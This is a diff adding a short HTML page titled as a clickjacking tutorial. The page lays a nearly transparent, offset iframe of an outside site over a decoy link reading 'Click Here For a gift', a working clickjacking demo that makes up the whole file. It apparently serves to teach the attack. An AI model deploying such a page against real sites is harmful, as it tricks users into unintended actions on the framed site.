@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Welcome to Clickjacking tutorial</title>
+</head>
+<body>
+
+<script
+        src="https://code.jquery.com/jquery-3.3.1.min.js"
+        integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
+        crossorigin="anonymous"></script>
+
+<h1>Click jacking sample</h1>
+<div style="overflow: hidden; z-index: 200;opacity: 0.1;">
+    <iframe scrolling="yes" src="http://www.mywebsite.org/posts" style="border: 0px none; margin-left: -350px; height: 300px; margin-top: -150px; width: 500px;">
+    </iframe>
+</div>
+
+<div style="margin-top: -146px;z-index: 0 "> Click <a>Here</a> For a gift</div>
+
+
+<script>
+
+</script>
+</body>
+</html>
